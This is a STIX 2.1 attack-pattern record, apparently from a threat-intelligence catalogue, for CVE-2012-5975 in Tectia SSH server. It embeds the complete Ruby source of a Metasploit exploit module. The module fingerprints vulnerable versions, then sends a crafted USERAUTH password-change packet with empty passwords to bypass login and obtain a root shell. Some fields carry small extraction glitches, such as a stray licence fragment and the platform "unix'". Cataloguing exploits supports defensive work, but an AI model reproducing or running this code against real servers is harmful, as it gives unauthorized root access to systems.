{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fc625c0e-052e-4f04-89f5-5a0dd191ca2e",
    "created": "2024-08-14T17:14:23.91196Z",
    "modified": "2024-08-14T17:14:23.911963Z",
    "name": "\"Tectia SSH USERAUTH Change Request Password Reset Vulnerability\"",
    "description": " This module exploits a vulnerability in Tectia SSH server for Unix-based platforms.  The bug is caused by a SSH2_MSG_USERAUTH_PASSWD_CHANGEREQ request before password authentication, allowing any remote user to bypass the login routine, and then gain access as root.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/ssh/tectia_passwd_changereq.rb",
            "external_id": "tectia_passwd_changereq.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-5975"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2012/Dec/12"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\nrequire 'net/ssh/command_stream'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::SSH\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Tectia SSH USERAUTH Change Request Password Reset Vulnerability\",\n      'Description'    => %q{\n          This module exploits a vulnerability in Tectia SSH server for Unix-based\n        platforms.  The bug is caused by a SSH2_MSG_USERAUTH_PASSWD_CHANGEREQ request\n        before password authentication, allowing any remote user to bypass the login\n        routine, and then gain access as root.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'kingcope',  #Original 0day\n          'bperry',\n          'sinn3r'\n        ],\n      'References'     =>\n        [\n          ['CVE', '2012-5975'],\n          ['EDB', '23082'],\n          ['OSVDB', '88103'],\n          ['URL', 'https://seclists.org/fulldisclosure/2012/Dec/12']\n        ],\n      'Payload'        =>\n        {\n          'Compat' =>\n          {\n            'PayloadType'    => 'cmd_interact',\n            'ConnectionType' => 'find'\n          }\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          ['Unix-based Tectia SSH 6.3 or prior', {}]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2012-12-01',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(22),\n        OptString.new('USERNAME', [true, 'The username to login as', 'root'])\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])\n      ]\n    )\n  end\n\n  def check\n    connect\n    banner = sock.get_once.to_s.strip\n    vprint_status(\"#{rhost}:#{rport} - Banner: #{banner}\")\n    disconnect\n\n    # Vulnerable version info obtained from CVE\n    version = banner.scan(/\\-(\\d\\.\\d\\.\\d*).+SSH Tectia/).flatten[0] || ''\n    build   = version.split('.')[-1].to_i\n\n    case version\n    when /^6\\.0/\n      unless (4..14).include?(build) or (17..20).include?(build)\n        return Exploit::CheckCode::Safe\n      end\n\n    when /^6\\.1/\n      unless (0..9).include?(build) or build == 12\n        return Exploit::CheckCode::Safe\n      end\n\n    when /^6\\.2/\n      unless (0..5).include?(build)\n        return Exploit::CheckCode::Safe\n      end\n\n    when /^6\\.3/\n      unless (0..2).include?(build)\n        return Exploit::CheckCode::Safe\n      end\n    else\n      return Exploit::CheckCode::Safe\n    end\n\n    # The vulnerable version must use PASSWORD method\n    user = Rex::Text.rand_text_alpha(4)\n    transport, connection = init_ssh(user)\n    return Exploit::CheckCode::Vulnerable if is_passwd_method?(user, transport)\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def rhost\n    datastore['RHOST']\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def is_passwd_method?(user, transport)\n    # A normal client is expected to send a ssh-userauth packet.\n    # Without it, the module can hang against non-vulnerable SSH servers.\n    transport.send_message(transport.service_request(\"ssh-userauth\"))\n    message = transport.next_message\n\n    # 6 means SERVICE_ACCEPT\n    if message.type != 6\n      print_error(\"Unexpected message: #{message.inspect}\")\n      return false\n    end\n\n    # We send this packet as an attempt to see what auth methods are available.\n    # The only auth method we want is PASSWORD.\n    pkt = Net::SSH::Buffer.from(\n      :byte, 0x32,               #userauth request\n      :string, user,             #username\n      :string, \"ssh-connection\", #service\n      :string, \"password\"        #method name\n    )\n    pkt.write_bool(true)\n    pkt.write_string(\"\")           #Old pass\n    pkt.write_string(\"\")           #New pass\n\n    transport.send_message(pkt)\n    message = transport.next_message\n\n    # Type 51 means the server is trying to tell us what auth methods are allowed.\n    if message.type == 51 and message.to_s !~ /password/\n      print_error(\"#{rhost}:#{rport} - This host does not use password method authentication\")\n      return false\n    end\n\n    return true\n  end\n\n  #\n  # The following link is useful to understand how to craft the USERAUTH password change\n  # request packet:\n  # http://fossies.org/dox/openssh-6.1p1/sshconnect2_8c_source.html#l00903\n  #\n  def userauth_passwd_change(user, transport, connection)\n    print_status(\"#{rhost}:#{rport} - Sending USERAUTH Change request...\")\n    pkt = Net::SSH::Buffer.from(\n      :byte, 0x32,               #userauth request\n      :string, user,             #username\n      :string, \"ssh-connection\", #service\n      :string, \"password\"        #method name\n    )\n    pkt.write_bool(true)\n    pkt.write_string(\"\")           #Old pass\n    pkt.write_string(\"\")           #New pass\n\n    transport.send_message(pkt)\n    message = transport.next_message.type\n    print_status(\"#{rhost}:#{rport} - Auths that can continue: #{message.inspect}\")\n\n    if message.to_i == 52 #SSH2_MSG_USERAUTH_SUCCESS\n      transport.send_message(transport.service_request(\"ssh-userauth\"))\n      message = transport.next_message.type\n\n      if message.to_i == 6 #SSH2_MSG_SERVICE_ACCEPT\n        shell = Net::SSH::CommandStream.new(connection)\n        connection = nil\n        return shell\n      end\n    end\n  end\n\n  def init_ssh(user)\n    opts = ssh_client_defaults.merge({\n      :user            => user,\n      :port            => rport\n    })\n    options    = Net::SSH::Config.for(rhost, Net::SSH::Config.default_files).merge(opts)\n    transport  = Net::SSH::Transport::Session.new(rhost, options)\n    connection = Net::SSH::Connection::Session.new(transport, options)\n\n    return transport, connection\n  end\n\n  def do_login(user)\n    transport, connection = init_ssh(user)\n    passwd = is_passwd_method?(user, transport)\n\n    if passwd\n      conn = userauth_passwd_change(user, transport, connection)\n      return conn\n    end\n  end\n\n  def exploit\n    c = nil\n\n    begin\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        c = do_login(datastore['USERNAME'])\n      end\n    rescue Rex::ConnectionError\n      return\n    rescue Net::SSH::Disconnect, ::EOFError\n      print_error \"#{rhost}:#{rport} SSH - Timed out during negotiation\"\n      return\n    rescue Net::SSH::Exception => e\n      print_error \"#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}\"\n      return\n    rescue ::Timeout::Error\n      print_error \"#{rhost}:#{rport} SSH - Timed out during negotiation\"\n      return\n    end\n\n    handler(c.lsock) if c\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-12-01",
    "x_mitre_platforms": [
        "unix'"
    ]
}